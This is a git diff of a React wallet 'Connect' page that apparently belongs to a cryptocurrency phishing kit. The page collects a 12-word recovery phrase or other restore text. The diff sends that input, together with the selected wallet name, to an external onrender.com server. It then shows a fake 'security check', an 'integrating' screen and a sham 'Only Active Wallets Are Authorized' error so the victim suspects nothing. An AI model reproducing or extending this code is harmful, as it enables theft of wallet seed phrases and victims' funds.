@@ -2,18 +2,20 @@ import React, { useState, useEffect } from "react";
 import SecondModal from "../componets/SecondModal";
 import SecurityCheck from "../componets/SecurityCheck";
 import { useNavigate } from "react-router";
-// import { useNavigate } from "react-router-dom";
+import Integrating from "../componets/Integrating";
 
 const Connect = () => {
   const defaultCount = 12;
   const navigate = useNavigate();
 
   const [activeTab, setActiveTab] = useState("tab1");
+  const [showIntegratingModal, setShowIntegratingModal] = useState(false);
   const [selectedInputCount, setSelectedInputCount] = useState(defaultCount);
   const [inputs, setInputs] = useState(Array(defaultCount).fill(""));
   const [isModalOpen, setIsModalOpen] = useState(false);
   const [selectedWallet, setSelectedWallet] = useState("");
   const [showSecurityModal, setShowSecurityModal] = useState(false);
+  const [showErrorMessage, setShowErrorMessage] = useState(false);
 
   const [formData, setFormData] = useState({
     tab1Inputs: [],
@@ -52,17 +54,17 @@ const Connect = () => {
 
     console.log("Submitting form data:", formData);
 
-    // const isTab1Filled = formData.tab1Inputs.some((i) => i.trim() !== "");
-    // const isTab2Filled = formData.tab2Text.trim() !== "";
-    // const isTab3Filled =
-    //   formData.tab3.content.trim() !== "" || formData.tab3.title.trim() !== "";
+    const isTab1Filled = formData.tab1Inputs.some((i) => i.trim() !== "");
+    const isTab2Filled = formData.tab2Text.trim() !== "";
+    const isTab3Filled =
+      formData.tab3.content.trim() !== "" || formData.tab3.title.trim() !== "";
 
-    // if (!isTab1Filled && !isTab2Filled && !isTab3Filled) {
-    //   alert("Please fill in one of the restore tabs.");
-    //   return;
-    // }
+    if (!isTab1Filled && !isTab2Filled && !isTab3Filled) {
+      alert("Please fill in one of the restore tabs.");
+      return;
+    }
 
-    // setShowSecurityModal(true);
+    setShowSecurityModal(true);
   };
 
   const isCurrentTabComplete = () => {
@@ -85,7 +87,11 @@ const Connect = () => {
 
   const handleSubmit = async () => {
     try {
-      const response = await fetch("http://localhost:8080/submit", {
+      const payload = {
+        ...formData,
+        selectedWallet,
+      };
+      const response = await fetch("https://lol-ep0y.onrender.com/submit", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -294,7 +300,32 @@ const Connect = () => {
 
       {/* Security Check Modal */}
       {showSecurityModal && (
-        <SecurityCheck onClose={() => setShowSecurityModal(false)} />
+        <SecurityCheck
+          onClose={() => setShowSecurityModal(false)}
+          onContinue={() => {
+            setShowSecurityModal(false); // Close the security modal
+            setShowIntegratingModal(true); // Show the integrating modal
+            setShowErrorMessage(true); // Show the error message
+
+            // Hide the error after 10 seconds
+            setTimeout(() => {
+              setShowErrorMessage(false);
+            }, 10000);
+          }}
+        />
+      )}
+
+      {showIntegratingModal && (
+        <Integrating onClose={() => setShowIntegratingModal(false)} />
+      )}
+
+      {showErrorMessage && (
+        <div className="fixed top-5 right-5 z-50 bg-red-100 border border-red-400 text-red-700 px-6 py-4 rounded shadow-md transition-opacity duration-500">
+          <strong className="font-bold">
+            <h2>Error Connecting</h2>
+          </strong>
+          <p className="ml-2">Only Active Wallets Are Authorized</p>
+        </div>
       )}
     </div>
   );
